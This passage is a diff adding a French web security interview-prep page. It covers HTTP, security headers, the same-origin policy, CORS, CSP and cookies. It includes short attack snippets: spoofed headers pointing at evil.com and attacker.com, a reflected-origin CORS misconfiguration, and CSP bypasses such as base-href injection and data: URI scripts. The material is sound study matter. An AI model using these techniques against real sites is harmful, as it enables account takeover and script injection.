@@ -1,0 +1,2266 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security — Interview Prep</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap');
+
+  :root {
+    --bg: #060910;
+    --bg2: #0c1018;
+    --bg3: #121820;
+    --border: #1e2a38;
+    --accent: #00e5ff;
+    --accent2: #ff3c6e;
+    --accent3: #a0ff6e;
+    --accent4: #ffb800;
+    --text: #cdd6e0;
+    --text-dim: #5a7080;
+    --text-bright: #eaf4ff;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'JetBrains Mono', monospace;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    font-size: 13.5px;
+  }
+
+  /* ── HEADER ── */
+  header {
+    background: var(--bg2);
+    border-bottom: 1px solid var(--border);
+    padding: 28px 40px;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    position: sticky;
+    top: 41px;
+    z-index: 100;
+    backdrop-filter: blur(12px);
+  }
+
+  .logo {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 20px;
+    color: var(--accent);
+    letter-spacing: -0.5px;
+    white-space: nowrap;
+  }
+  .logo span { color: var(--accent2); }
+
+  .header-meta {
+    margin-left: auto;
+    display: flex;
+    gap: 12px;
+    align-items: center;
+  }
+
+  .badge {
+    padding: 4px 12px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+  .badge-red { background: rgba(255,60,110,0.15); color: var(--accent2); border: 1px solid rgba(255,60,110,0.3); }
+  .badge-cyan { background: rgba(0,229,255,0.1); color: var(--accent); border: 1px solid rgba(0,229,255,0.25); }
+  .badge-green { background: rgba(160,255,110,0.1); color: var(--accent3); border: 1px solid rgba(160,255,110,0.25); }
+
+  /* ── LAYOUT ── */
+  .container { display: flex; min-height: 100vh; }
+
+  /* SIDEBAR */
+  nav {
+    width: 260px;
+    min-width: 260px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    padding: 24px 0;
+    position: sticky;
+    top: 114px;
+    height: calc(100vh - 114px);
+    overflow-y: auto;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+
+  nav::-webkit-scrollbar { width: 4px; }
+  nav::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+  .nav-section {
+    padding: 0 20px 16px;
+    margin-bottom: 8px;
+  }
+
+  .nav-label {
+    font-size: 9px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    padding: 0 12px;
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  nav a {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 7px 12px;
+    color: var(--text-dim);
+    text-decoration: none;
+    border-radius: 5px;
+    font-size: 12px;
+    transition: all 0.15s;
+    border-left: 2px solid transparent;
+  }
+
+  nav a:hover { color: var(--accent); background: rgba(0,229,255,0.05); border-left-color: var(--accent); }
+  nav a.active { color: var(--accent); background: rgba(0,229,255,0.08); border-left-color: var(--accent); }
+  nav a .dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; flex-shrink: 0; opacity: 0.7; }
+
+  /* MAIN */
+  main {
+    flex: 1;
+    padding: 40px;
+    max-width: calc(100% - 260px);
+    overflow-x: hidden;
+  }
+
+  /* PROGRESS */
+  .progress-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    z-index: 999;
+    transition: width 0.1s;
+    width: 0%;
+  }
+
+  /* SECTIONS */
+  .section {
+    margin-bottom: 56px;
+    scroll-margin-top: 150px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 28px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-number {
+    font-family: 'Syne', sans-serif;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  h2 {
+    font-family: 'Syne', sans-serif;
+    font-size: 22px;
+    font-weight: 800;
+    color: var(--text-bright);
+    letter-spacing: -0.3px;
+  }
+
+  h3 {
+    font-family: 'Syne', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--accent);
+    margin: 28px 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  h3::before { content: '▶'; font-size: 9px; opacity: 0.7; }
+
+  h4 {
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin: 16px 0 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  p { margin-bottom: 12px; color: var(--text); }
+
+  /* CARDS */
+  .card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px 24px;
+    margin-bottom: 16px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+  }
+
+  .card-danger::before { background: var(--accent2); }
+  .card-info::before { background: var(--accent); }
+  .card-success::before { background: var(--accent3); }
+  .card-warn::before { background: var(--accent4); }
+
+  /* CODE */
+  pre, code {
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  pre {
+    background: #080d12;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px 20px;
+    overflow-x: auto;
+    font-size: 12px;
+    line-height: 1.6;
+    margin: 12px 0;
+    position: relative;
+  }
+
+  .pre-label {
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 9px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  code {
+    background: rgba(0,229,255,0.08);
+    color: var(--accent);
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-size: 12px;
+  }
+
+  pre code { background: none; color: inherit; padding: 0; }
+
+  /* SYNTAX COLORS */
+  .kw { color: #ff79c6; }
+  .str { color: #f1fa8c; }
+  .cm { color: #6272a4; font-style: italic; }
+  .fn { color: #50fa7b; }
+  .attr { color: var(--accent); }
+  .val { color: #ffb86c; }
+  .url { color: #8be9fd; text-decoration: underline; }
+
+  /* GRID */
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px; }
+
+  @media (max-width: 1100px) {
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+  }
+
+  /* TABLE */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 12.5px;
+  }
+
+  th {
+    background: rgba(0,229,255,0.07);
+    color: var(--accent);
+    padding: 10px 14px;
+    text-align: left;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  td {
+    padding: 9px 14px;
+    border-bottom: 1px solid rgba(30,42,56,0.5);
+    vertical-align: top;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(0,229,255,0.02); }
+
+  /* Q&A */
+  .qa-container { margin-top: 16px; }
+
+  .qa-item {
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 12px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .qa-item:hover { border-color: rgba(0,229,255,0.3); }
+
+  .qa-question {
+    padding: 14px 20px;
+    cursor: pointer;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: var(--bg3);
+    user-select: none;
+    transition: background 0.15s;
+  }
+
+  .qa-question:hover { background: rgba(0,229,255,0.04); }
+
+  .qa-number {
+    font-size: 10px;
+    color: var(--accent2);
+    font-weight: 700;
+    min-width: 28px;
+    margin-top: 1px;
+    font-family: 'Syne', sans-serif;
+  }
+
+  .qa-q-text {
+    flex: 1;
+    font-size: 13px;
+    color: var(--text-bright);
+    font-weight: 500;
+  }
+
+  .qa-chevron {
+    color: var(--text-dim);
+    font-size: 12px;
+    transition: transform 0.2s;
+    margin-top: 2px;
+  }
+
+  .qa-item.open .qa-chevron { transform: rotate(180deg); }
+
+  .qa-answer {
+    display: none;
+    padding: 16px 20px 16px 60px;
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    font-size: 12.5px;
+    color: var(--text);
+    line-height: 1.75;
+  }
+
+  .qa-item.open .qa-answer { display: block; }
+
+  .qa-answer strong { color: var(--accent3); }
+  .qa-answer em { color: var(--accent4); font-style: normal; font-weight: 600; }
+
+  /* TAGS */
+  .tag {
+    display: inline-block;
+    padding: 2px 9px;
+    border-radius: 12px;
+    font-size: 10px;
+    font-weight: 700;
+    margin: 2px;
+    letter-spacing: 0.3px;
+  }
+
+  .tag-critical { background: rgba(255,60,110,0.15); color: #ff6090; }
+  .tag-high { background: rgba(255,184,0,0.15); color: var(--accent4); }
+  .tag-medium { background: rgba(0,229,255,0.12); color: var(--accent); }
+  .tag-low { background: rgba(160,255,110,0.12); color: var(--accent3); }
+
+  /* OWASP CARDS */
+  .owasp-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 14px;
+    margin: 16px 0;
+  }
+
+  .owasp-card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 18px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+  }
+
+  .owasp-card:hover { border-color: rgba(0,229,255,0.4); transform: translateY(-2px); }
+
+  .owasp-num {
+    font-size: 24px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    color: rgba(0,229,255,0.15);
+    position: absolute;
+    top: 10px;
+    right: 14px;
+  }
+
+  .owasp-title {
+    font-family: 'Syne', sans-serif;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin-bottom: 6px;
+    padding-right: 40px;
+  }
+
+  .owasp-desc {
+    font-size: 11.5px;
+    color: var(--text-dim);
+    line-height: 1.6;
+  }
+
+  /* DIVIDER */
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 32px 0;
+  }
+
+  /* ALERT */
+  .alert {
+    padding: 14px 18px;
+    border-radius: 6px;
+    margin: 12px 0;
+    font-size: 12.5px;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+
+  .alert-icon { font-size: 16px; flex-shrink: 0; }
+  .alert-danger { background: rgba(255,60,110,0.08); border: 1px solid rgba(255,60,110,0.2); color: #ff8a9e; }
+  .alert-info { background: rgba(0,229,255,0.06); border: 1px solid rgba(0,229,255,0.18); color: #80e8f8; }
+  .alert-success { background: rgba(160,255,110,0.06); border: 1px solid rgba(160,255,110,0.18); color: #b0e890; }
+
+  /* INTRO */
+  .intro-hero {
+    background: linear-gradient(135deg, rgba(0,229,255,0.05) 0%, rgba(255,60,110,0.05) 100%);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 32px 36px;
+    margin-bottom: 48px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .intro-hero::after {
+    content: '</sec>';
+    position: absolute;
+    bottom: 16px;
+    right: 24px;
+    font-family: 'Syne', sans-serif;
+    font-size: 48px;
+    font-weight: 800;
+    color: rgba(0,229,255,0.04);
+    letter-spacing: -2px;
+  }
+
+  .intro-hero h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: 32px;
+    font-weight: 800;
+    color: var(--text-bright);
+    margin-bottom: 8px;
+    letter-spacing: -1px;
+  }
+
+  .intro-hero h1 span { color: var(--accent); }
+
+  .intro-subtitle { color: var(--text-dim); font-size: 13px; margin-bottom: 20px; }
+
+  .intro-stats {
+    display: flex;
+    gap: 24px;
+    flex-wrap: wrap;
+  }
+
+  .stat {
+    text-align: center;
+    padding: 12px 16px;
+    background: rgba(0,0,0,0.3);
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    min-width: 90px;
+  }
+
+  .stat-num {
+    font-family: 'Syne', sans-serif;
+    font-size: 24px;
+    font-weight: 800;
+    color: var(--accent);
+    display: block;
+  }
+
+  .stat-label { font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+
+  ul { padding-left: 20px; margin-bottom: 12px; }
+  li { margin-bottom: 6px; color: var(--text); }
+  li::marker { color: var(--accent); }
+
+  .highlight { color: var(--accent); font-weight: 600; }
+  .danger-text { color: var(--accent2); font-weight: 600; }
+  .success-text { color: var(--accent3); font-weight: 600; }
+  .warn-text { color: var(--accent4); font-weight: 600; }
+
+  /* SCROLL ANIM */
+  .section { opacity: 1; transform: translateY(0); transition: opacity 0.4s, transform 0.4s; }
+  .section.visible { opacity: 1; transform: translateY(0); }
+
+  /* COPY BTN */
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    left: 12px;
+    padding: 3px 10px;
+    font-size: 9px;
+    border: 1px solid var(--border);
+    background: var(--bg3);
+    color: var(--text-dim);
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    letter-spacing: 0.5px;
+    transition: all 0.15s;
+  }
+  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* CHECKLIST */
+  .checklist { list-style: none; padding: 0; }
+  .checklist li {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 7px 0;
+    border-bottom: 1px solid rgba(30,42,56,0.4);
+    cursor: pointer;
+  }
+  .checklist li:last-child { border-bottom: none; }
+  .checklist .check {
+    width: 16px;
+    height: 16px;
+    border: 1.5px solid var(--border);
+    border-radius: 3px;
+    flex-shrink: 0;
+    margin-top: 2px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
+    transition: all 0.15s;
+  }
+  .checklist li.done .check { background: var(--accent3); border-color: var(--accent3); color: #000; }
+  .checklist li.done span { text-decoration: line-through; color: var(--text-dim); }
+
+  /* ══════════════════════════════
+     MOBILE RESPONSIVE
+  ══════════════════════════════ */
+
+  /* Hamburger button */
+  .nav-toggle {
+    display: none;
+    background: none;
+    border: 1px solid var(--border);
+    color: var(--accent);
+    padding: 6px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+    line-height: 1;
+    margin-left: auto;
+  }
+
+  @media (max-width: 768px) {
+    header {
+      padding: 14px 18px;
+      flex-wrap: wrap;
+      gap: 10px;
+      top: 41px; /* below cross-nav */
+    }
+
+    .nav-toggle { display: block; }
+
+    .header-meta { display: none; }
+
+    .logo { font-size: 16px; }
+
+    nav {
+      width: 100%;
+      min-width: unset;
+      position: fixed;
+      top: 0;
+      left: -100%;
+      height: 100vh;
+      z-index: 300;
+      transition: left 0.3s ease;
+      padding-top: 60px;
+    }
+
+    nav.open { left: 0; }
+
+    .nav-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 299;
+    }
+    .nav-overlay.open { display: block; }
+
+    .container { flex-direction: column; }
+
+    main {
+      padding: 16px;
+      max-width: 100%;
+    }
+
+    .intro-hero { padding: 20px 16px; }
+    .intro-hero h1 { font-size: 22px; }
+    .intro-stats { gap: 10px; }
+    .stat { min-width: 60px; padding: 8px 10px; }
+    .stat-num { font-size: 18px; }
+
+    .grid-2, .grid-3 { grid-template-columns: 1fr !important; }
+    .owasp-grid { grid-template-columns: 1fr; }
+
+    h2 { font-size: 17px; }
+    h3 { font-size: 13px; }
+
+    pre {
+      font-size: 11px;
+      padding: 12px;
+      overflow-x: auto;
+      white-space: pre;
+      word-break: normal;
+    }
+
+    table {
+      display: block;
+      overflow-x: auto;
+      white-space: nowrap;
+      font-size: 11px;
+    }
+
+    .section-header { flex-wrap: wrap; gap: 8px; }
+    .badge { font-size: 9px; padding: 2px 8px; }
+
+    .qa-answer { padding: 14px 14px 14px 14px; }
+    .qa-q-text { font-size: 12px; }
+
+    body { font-size: 12.5px; }
+
+    /* Cross-nav mobile */
+    div[style*="z-index: 200"] {
+      padding: 8px 14px !important;
+      font-size: 10px !important;
+    }
+  }
+
+</style>
+<link rel="stylesheet" href="mobile.css">
+</head>
+<body>
+
+<div style="background:#070b12;border-bottom:1px solid #1e2a38;padding:10px 28px;display:flex;align-items:center;gap:14px;font-family:'JetBrains Mono',monospace;font-size:11px;position:sticky;top:0;z-index:200;">
+  <a href="index.html" style="color:#5a7080;text-decoration:none;font-weight:700;letter-spacing:1px;transition:color 0.15s;" onmouseover="this.style.color='#00e5ff'" onmouseout="this.style.color='#5a7080'">← HOME</a>
+  <span style="color:#1e2a38;">|</span>
+  <span style="color:#00e5ff;font-weight:700;letter-spacing:0.5px;">🌐 WEB SECURITY</span>
+  <span style="color:#1e2a38;margin-left:auto;">|</span>
+  <a href="llm.html" style="color:#5a7080;text-decoration:none;font-weight:700;transition:color 0.15s;" onmouseover="this.style.color='#a78bfa'" onmouseout="this.style.color='#5a7080'">🤖 LLM + Agentic 2026 →</a>
+</div>
+
+<div class="progress-bar" id="progress"></div>
+
+<header>
+  <button class="hamburger" id="hamburgerBtn" aria-label="Menu">☰</button>
+  <div class="logo">WEB<span>.SEC</span></div>
+  <div class="header-meta">
+  </div>
+  <button class="nav-toggle" onclick="toggleNav()" aria-label="Menu">☰</button>
+</header>
+<div class="nav-overlay" id="navOverlay" onclick="closeNav()"></div>
+
+<div class="container">
+
+<!-- NAV -->
+<nav id="sidebar">
+<button class="nav-close" id="navClose">✕</button>
+  <span class="nav-label">Fondations</span>
+  <div class="nav-section">
+    <a href="#http"><span class="dot"></span>HTTP Protocol</a>
+    <a href="#browsers"><span class="dot"></span>Browser Security</a>
+    <a href="#owasp"><span class="dot"></span>OWASP Top 10 2025</a>
+  </div>
+  <span class="nav-label">Vulnérabilités Web</span>
+  <div class="nav-section">
+    <a href="#xss"><span class="dot"></span>XSS</a>
+    <a href="#sqli"><span class="dot"></span>SQL Injection</a>
+    <a href="#csrf"><span class="dot"></span>CSRF</a>
+    <a href="#ssrf"><span class="dot"></span>SSRF</a>
+    <a href="#xxe"><span class="dot"></span>XXE</a>
+    <a href="#idor"><span class="dot"></span>IDOR / BAC</a>
+    <a href="#traversal"><span class="dot"></span>Path Traversal / LFI</a>
+    <a href="#cmdi"><span class="dot"></span>Command Injection</a>
+    <a href="#ssti"><span class="dot"></span>SSTI</a>
+    <a href="#deser"><span class="dot"></span>Deserialization</a>
+  </div>
+  <span class="nav-label">Auth & Sessions</span>
+  <div class="nav-section">
+    <a href="#auth"><span class="dot"></span>Auth & Sessions</a>
+    <a href="#jwt"><span class="dot"></span>JWT Attacks</a>
+    <a href="#oauth"><span class="dot"></span>OAuth / OIDC</a>
+  </div>
+  <span class="nav-label">Avancé</span>
+  <div class="nav-section">
+    <a href="#cors"><span class="dot"></span>CORS / SOP / CSP</a>
+    <a href="#smuggling"><span class="dot"></span>HTTP Smuggling</a>
+    <a href="#cache"><span class="dot"></span>Cache Poisoning</a>
+    <a href="#api"><span class="dot"></span>API Security</a>
+    <a href="#clickjacking"><span class="dot"></span>Clickjacking</a>
+  </div>
+  <span class="nav-label">Recherche 2025</span>
+  <div class="nav-section">
+    <a href="#psresearch"><span class="dot"></span>PortSwigger Research</a>
+  </div>
+  <span class="nav-label">Entraînement</span>
+  <div class="nav-section">
+    <a href="#questions"><span class="dot"></span>Questions techniques</a>
+    <a href="#scenarios"><span class="dot"></span>Scénarios pratiques</a>
+    <a href="#checklist"><span class="dot"></span>Checklist finale</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<main>
+
+<!-- HERO -->
+<div class="intro-hero">
+  <h1>Web <span>Security</span> Interview</h1>
+  <p class="intro-subtitle">Dossier de préparation · Junior Security Researcher · OWASP 2025 + PortSwigger Research</p>
+  <div class="intro-stats">
+    <div class="stat"><span class="stat-num">22</span><span class="stat-label">Domaines</span></div>
+    <div class="stat"><span class="stat-num">26</span><span class="stat-label">Q&A</span></div>
+    <div class="stat"><span class="stat-num">2025</span><span class="stat-label">OWASP</span></div>
+    <div class="stat"><span class="stat-num">PS</span><span class="stat-label">Research</span></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+  1. HTTP PROTOCOL
+══════════════════════════════════════ -->
+<section class="section" id="http">
+  <div class="section-header">
+    <span class="section-number">01</span>
+    <h2>HTTP Protocol — Deep Dive</h2>
+    <span class="badge badge-cyan">FONDAMENTAL</span>
+  </div>
+
+  <div class="alert alert-danger">
+    <span class="alert-icon">⚡</span>
+    <div><strong>Critique.</strong> Tout repose sur HTTP. Un interviewer peut partir de n'importe quelle couche — méthodes, headers, status codes, versions — et remonter vers les vulnérabilités. Maîtrise-le parfaitement.</div>
+  </div>
+
+  <h3>Méthodes HTTP & implications sécurité</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Méthode</th><th>Usage</th><th>Risque sécurité</th></tr>
+    <tr><td><code>GET</code></td><td>Lecture, idempotent, cacheable</td><td>Params en URL → logs, historique, Referer leakage</td></tr>
+    <tr><td><code>POST</code></td><td>Création, non-idempotent</td><td>Double-submit, CSRF, mass assignment</td></tr>
+    <tr><td><code>PUT</code></td><td>Remplacement complet</td><td>Overwrite de ressources, IDOR</td></tr>
+    <tr><td><code>PATCH</code></td><td>Modification partielle</td><td>Idem PUT, souvent moins protégé</td></tr>
+    <tr><td><code>DELETE</code></td><td>Suppression</td><td>IDOR, autorisation faible</td></tr>
+    <tr><td><code>OPTIONS</code></td><td>CORS preflight, liste des méthodes</td><td>Info disclosure, misconfiguration CORS</td></tr>
+    <tr><td><code>HEAD</code></td><td>Comme GET sans body</td><td>Fingerprinting, SSRF probe</td></tr>
+    <tr><td><code>TRACE</code></td><td>Echo de la requête (debug)</td><td>XST (Cross-Site Tracing) → à désactiver</td></tr>
+    <tr><td><code>CONNECT</code></td><td>Tunnel HTTP (proxy)</td><td>Proxy abuse, SSRF via CONNECT</td></tr>
+  </table></div>
+
+  <h3>Headers HTTP critiques</h3>
+
+  <h4>Security Headers (réponse)</h4>
+  <div class="table-wrap"><table>
+    <tr><th>Header</th><th>Valeur exemple</th><th>Protection</th></tr>
+    <tr><td><code>Content-Security-Policy</code></td><td><code>default-src 'self'</code></td><td>XSS, data injection</td></tr>
+    <tr><td><code>Strict-Transport-Security</code></td><td><code>max-age=31536000; includeSubDomains</code></td><td>MITM, SSL stripping</td></tr>
+    <tr><td><code>X-Frame-Options</code></td><td><code>DENY</code></td><td>Clickjacking</td></tr>
+    <tr><td><code>X-Content-Type-Options</code></td><td><code>nosniff</code></td><td>MIME sniffing</td></tr>
+    <tr><td><code>Referrer-Policy</code></td><td><code>strict-origin-when-cross-origin</code></td><td>Info leakage via Referer</td></tr>
+    <tr><td><code>Permissions-Policy</code></td><td><code>camera=(), microphone=()</code></td><td>Feature abuse</td></tr>
+    <tr><td><code>Set-Cookie</code></td><td><code>Secure; HttpOnly; SameSite=Strict</code></td><td>Cookie theft, CSRF</td></tr>
+    <tr><td><code>Access-Control-Allow-Origin</code></td><td><code>https://trusted.com</code></td><td>CORS control</td></tr>
+  </table></div>
+
+  <h4>Headers de requête intéressants</h4>
+  <pre><span class="cm"># Headers souvent exploitables en SSRF / injection</span>
+<span class="attr">X-Forwarded-For</span>: <span class="val">192.168.1.1</span>   <span class="cm"># Contournement IP restriction</span>
+<span class="attr">X-Real-IP</span>: <span class="val">127.0.0.1</span>           <span class="cm"># Même usage</span>
+<span class="attr">Host</span>: <span class="val">evil.com</span>                <span class="cm"># Host Header Injection → password reset poisoning</span>
+<span class="attr">Origin</span>: <span class="val">https://attacker.com</span>  <span class="cm"># Test CORS</span>
+<span class="attr">Referer</span>: <span class="val">...</span>                   <span class="cm"># Info leakage, CSRF validation bypass</span>
+<span class="attr">Authorization</span>: <span class="val">Bearer &lt;JWT&gt;</span>  <span class="cm"># JWT attacks</span>
+<span class="attr">Content-Type</span>: <span class="val">text/xml</span>        <span class="cm"># Changer pour déclencher XXE</span>
+<span class="attr">Transfer-Encoding</span>: <span class="val">chunked</span>   <span class="cm"># HTTP Smuggling</span></pre>
+
+  <h3>HTTP/1.1 vs HTTP/2 vs HTTP/3</h3>
+  <div class="grid-3">
+    <div class="card card-info">
+      <h4>HTTP/1.1</h4>
+      <p>Texte brut, une requête à la fois par connexion (pipelining théorique). <span class="highlight">Vulnérable au Smuggling TE.CL / CL.TE</span>. Keep-Alive par défaut.</p>
+    </div>
+    <div class="card card-warn">
+      <h4>HTTP/2</h4>
+      <p>Binaire, multiplexage, header compression (HPACK). <span class="warn-text">HTTP/2 Desync</span> possible en downgrade H2→H1. PUSH deprecié. Plus performant.</p>
+    </div>
+    <div class="card card-success">
+      <h4>HTTP/3 / QUIC</h4>
+      <p>UDP + TLS 1.3 intégré. Pas de TCP head-of-line blocking. Encore émergent en pentest.</p>
+    </div>
+  </div>
+
+  <h3>Status Codes importants en sécurité</h3>
+  <pre><span class="cm"># 2xx — Success</span>
+<span class="val">200</span> OK · <span class="val">201</span> Created · <span class="val">204</span> No Content
+
+<span class="cm"># 3xx — Redirection (exploitables pour open redirect)</span>
+<span class="val">301</span> Permanent · <span class="val">302</span> Found · <span class="val">307</span> Temporary · <span class="val">308</span> Permanent
+
+<span class="cm"># 4xx — Client Errors</span>
+<span class="val">400</span> Bad Request · <span class="val">401</span> Unauthorized (pas d'auth)
+<span class="val">403</span> Forbidden (auth ok mais pas le droit)
+<span class="val">404</span> Not Found · <span class="val">405</span> Method Not Allowed
+<span class="val">429</span> Too Many Requests (rate limiting)
+<span class="val">451</span> Unavailable for Legal Reasons
+
+<span class="cm"># 5xx — Server Errors (info disclosure)</span>
+<span class="val">500</span> Internal Server Error (stack trace?)
+<span class="val">502</span> Bad Gateway · <span class="val">503</span> Service Unavailable</pre>
+
+  <div class="alert alert-info">
+    <span class="alert-icon">💡</span>
+    <div><strong>Astuce interview :</strong> La différence 401 vs 403 est souvent demandée. 401 = non authentifié (doit fournir des credentials). 403 = authentifié mais non autorisé (forbidden).</div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════
+  2. BROWSER SECURITY
+══════════════════════════════════════ -->
+<section class="section" id="browsers">
+  <div class="section-header">
+    <span class="section-number">02</span>
+    <h2>Browser Security Model</h2>
+    <span class="badge badge-cyan">FONDAMENTAL</span>
+  </div>
+
+  <h3>Same-Origin Policy (SOP)</h3>
+  <div class="card card-info">
+    <p>La SOP est le mécanisme fondamental des navigateurs : un document d'une origine <strong>ne peut pas lire</strong> les réponses d'une autre origine.</p>
+    <p><strong>Origine = Schéma + Hostname + Port</strong></p>
+  </div>
+
+  <pre><span class="cm"># Même origine ✓</span>
+https://example.com/page   → https://example.com/api    <span class="fn">✓</span>
+
+<span class="cm"># Origines différentes ✗</span>
+https://example.com        → http://example.com          <span class="kw">✗</span> (schéma)
+https://example.com        → https://api.example.com     <span class="kw">✗</span> (sous-domaine)
+https://example.com        → https://example.com:8080    <span class="kw">✗</span> (port)
+https://example.com        → https://evil.com            <span class="kw">✗</span> (domaine)</pre>
+
+  <p><strong>Ce que SOP autorise malgré tout :</strong> embedding d'images/scripts/CSS cross-origin, form submissions cross-origin (d'où la nécessité du CSRF token), navigations cross-origin.</p>
+
+  <h3>CORS (Cross-Origin Resource Sharing)</h3>
+  <p>Mécanisme qui <em>assouplit</em> la SOP via des headers HTTP. Permet au serveur d'autoriser certaines origines à lire ses réponses.</p>
+
+  <pre><span class="cm"># Simple requests (GET, POST avec certains Content-Types) → pas de preflight</span>
+<span class="cm"># Complex requests → preflight OPTIONS d'abord</span>
+
+<span class="cm">### Requête preflight ###</span>
+OPTIONS /api/data HTTP/1.1
+<span class="attr">Origin</span>: https://attacker.com
+<span class="attr">Access-Control-Request-Method</span>: PUT
+<span class="attr">Access-Control-Request-Headers</span>: Authorization
+
+<span class="cm">### Réponse vulnérable ###</span>
+<span class="attr">Access-Control-Allow-Origin</span>: <span class="val">https://attacker.com</span>   <span class="cm"># refléter l'origine = VULN</span>
+<span class="attr">Access-Control-Allow-Credentials</span>: <span class="val">true</span>                <span class="cm"># permet cookies = CRITIQUE</span>
+
+<span class="cm">### Mauvaises configs courantes ###</span>
+Access-Control-Allow-Origin: *                          <span class="cm"># wildcard (mais pas avec credentials)</span>
+<span class="cm"># Regexp mal faite : authorise evil.com si la whitelist check "example.com" en substring</span>
+<span class="cm"># Null origin : Access-Control-Allow-Origin: null → exploitable via iframe sandboxé</span></pre>
+
+  <h3>Content Security Policy (CSP)</h3>
+  <p>En-tête qui contrôle quelles ressources le navigateur peut charger. Principal contre-mesure XSS.</p>
+
+  <pre><span class="cm"># CSP stricte (bonne)</span>
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'
+
+<span class="cm"># Bypasses CSP courants en interview</span>
+<span class="cm">1. JSONP endpoint sur whitelisted domain → exécution JS</span>
+<span class="cm">   script-src https://trusted.com → si trusted.com a /api/jsonp?callback=alert</span>
+
+<span class="cm">2. unsafe-inline → XSS directement</span>
+<span class="cm">3. unsafe-eval → permet eval(), new Function()</span>
+
+<span class="cm">4. Angular/React sur whitelisted domain → CSP bypass via framework gadgets</span>
+
+<span class="cm">5. base-uri non défini → injection &lt;base href="https://evil.com/"&gt; → relative URL hijack</span>
+
+<span class="cm">6. data: URI si autorisé → script src="data:text/javascript,alert(1)"</span></pre>
+
+  <h3>Cookies & attributs sécurité</h3>
+  <pre><span class="cm"># Cookie parfaitement sécurisé</span>
+Set-Cookie: sessionId=abc123; <span class="attr">HttpOnly</span>; <span class="attr">Secure</span>; <span class="attr">SameSite=Strict</span>; Path=/; Domain=example.com
+
+<span class="cm">HttpOnly   → JS ne peut pas lire (document.cookie) → bloque vol XSS</span>
